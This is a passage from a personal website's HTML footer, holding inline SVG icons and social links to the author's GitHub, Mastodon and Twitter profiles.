3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Twitter</span> </a></ul></footer>
